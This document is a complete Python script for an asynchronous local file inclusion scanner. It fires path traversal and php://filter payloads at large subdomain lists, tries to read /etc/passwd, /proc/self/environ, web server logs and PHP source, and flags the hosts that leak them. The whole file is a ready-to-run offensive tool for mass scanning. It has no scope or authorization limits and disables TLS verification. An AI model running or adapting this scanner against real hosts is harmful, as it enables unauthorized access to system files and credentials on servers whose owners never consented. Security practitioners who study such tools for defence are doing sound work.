#!/usr/bin/env python3
"""
Ultra-Fast LFI Scanner for Huge Subdomain Lists
Author: Fast LFI Scanner
"""

import asyncio
import aiohttp
import sys
import os
from urllib.parse import quote
from datetime import datetime
from typing import List, Optional

class UltraFastLFIScanner:
    def __init__(self, input_file: str, output_file: str = "fast_lfi_results.txt",
                 max_workers: int = 200, timeout: int = 5):
        self.input_file = input_file
        self.output_file = output_file
        self.max_workers = max_workers
        self.timeout = timeout
        
        # Only test the most effective payloads
        self.payloads = [
            "../../../../etc/passwd",
            "/etc/passwd",
            "....//....//....//etc/passwd",
            "/etc/passwd%00",
            "../../../../etc/hosts",
            "../../../../windows/win.ini",
            "/proc/self/environ",
            "/var/log/apache2/access.log",
            "php://filter/convert.base64-encode/resource=index.php"
        ]
        
        # Only test the most common parameters
        self.parameters = ['file', 'page', 'path', 'include', 'load', 'doc']
        
        # Quick indicators for /etc/passwd
        self.passwd_indicators = [
            'root:x:0:0:',
            'daemon:x:1:1:',
            'bin:x:2:2:',
            'sys:x:3:3:',
            'nobody:x:65534:65534:'
        ]

    async def init_session(self):
        """Initialize async HTTP session"""
        timeout = aiohttp.ClientTimeout(total=self.timeout)
        connector = aiohttp.TCPConnector(limit=self.max_workers, ssl=False)
        self.session = aiohttp.ClientSession(timeout=timeout, connector=connector)

    async def close_session(self):
        """Close async HTTP session"""
        if self.session:
            await self.session.close()

    def load_subdomains(self) -> List[str]:
        """Load subdomains from input file"""
        with open(self.input_file, 'r') as f:
            return [line.strip() for line in f if line.strip()]

    async def ultra_fast_test(self, subdomain: str) -> Optional[str]:
        """Ultra-fast LFI test for a single subdomain"""
        # Test both HTTP and HTTPS with single payload
        test_urls = []
        
        for param in self.parameters[:3]:  # Only first 3 parameters
            for payload in self.payloads[:3]:  # Only first 3 payloads
                test_urls.append(f"http://{subdomain}/?{param}={quote(payload)}")
                test_urls.append(f"https://{subdomain}/?{param}={quote(payload)}")
        
        for url in test_urls:
            try:
                async with self.session.get(url, timeout=3, allow_redirects=True, ssl=False) as response:
                    if response.status == 200:
                        text = await response.text(encoding='utf-8', errors='ignore')
                        
                        # Quick check for /etc/passwd
                        if any(indicator in text for indicator in self.passwd_indicators):
                            return f"[+] {subdomain} - {url}"
                        
                        # Check for PHP errors that indicate LFI
                        if any(error in text.lower() for error in 
                              ['failed to open stream', 'no such file', 'warning: include']):
                            return f"[?] {subdomain} - Possible LFI - {url}"
            
            except Exception:
                continue
        
        return None

    async def scan(self):
        """Main scanning function"""
        print("[+] Loading subdomains...")
        subdomains = self.load_subdomains()
        print(f"[+] Loaded {len(subdomains)} subdomains")
        
        await self.init_session()
        
        print("[+] Starting ultra-fast LFI scan...")
        print(f"[+] Workers: {self.max_workers}")
        print(f"[+] Timeout: {self.timeout}s")
        
        # Use semaphore for concurrency control
        semaphore = asyncio.Semaphore(self.max_workers)
        results = []
        scanned = 0
        
        async def test_with_limit(subdomain):
            async with semaphore:
                result = await self.ultra_fast_test(subdomain)
                
                nonlocal scanned
                scanned += 1
                
                if scanned % 500 == 0:
                    print(f"[+] Progress: {scanned}/{len(subdomains)}")
                
                return result
        
        # Create and execute tasks
        tasks = [test_with_limit(sub) for sub in subdomains]
        
        # Process in large batches
        batch_size = 1000
        for i in range(0, len(tasks), batch_size):
            batch = tasks[i:i + batch_size]
            batch_results = await asyncio.gather(*batch, return_exceptions=True)
            
            for result in batch_results:
                if isinstance(result, str):
                    results.append(result)
                    print(result)  # Print as we find them
        
        await self.close_session()
        
        # Save results
        with open(self.output_file, 'w') as f:
            f.write(f"Ultra-Fast LFI Scan Results\n")
            f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Total subdomains: {len(subdomains)}\n")
            f.write(f"Findings: {len(results)}\n")
            f.write("=" * 60 + "\n\n")
            
            for result in results:
                f.write(result + "\n")
        
        print(f"\n[+] Scan complete!")
        print(f"[+] Results saved to: {self.output_file}")
        print(f"[+] Total findings: {len(results)}")

async def main():
    if len(sys.argv) < 2:
        print("Usage: python3 fast_lfi_scanner.py all_subs.txt [output.txt]")
        print("       python3 fast_lfi_scanner.py all_subs.txt results.txt")
        sys.exit(1)
    
    input_file = sys.argv[1]
    output_file = sys.argv[2] if len(sys.argv) > 2 else "fast_lfi_results.txt"
    
    if not os.path.exists(input_file):
        print(f"[!] File not found: {input_file}")
        sys.exit(1)
    
    scanner = UltraFastLFIScanner(input_file, output_file)
    await scanner.scan()

if __name__ == "__main__":
    try:
        import aiohttp
    except ImportError:
        print("[!] Install required: pip install aiohttp")
        sys.exit(1)
    
    asyncio.run(main())
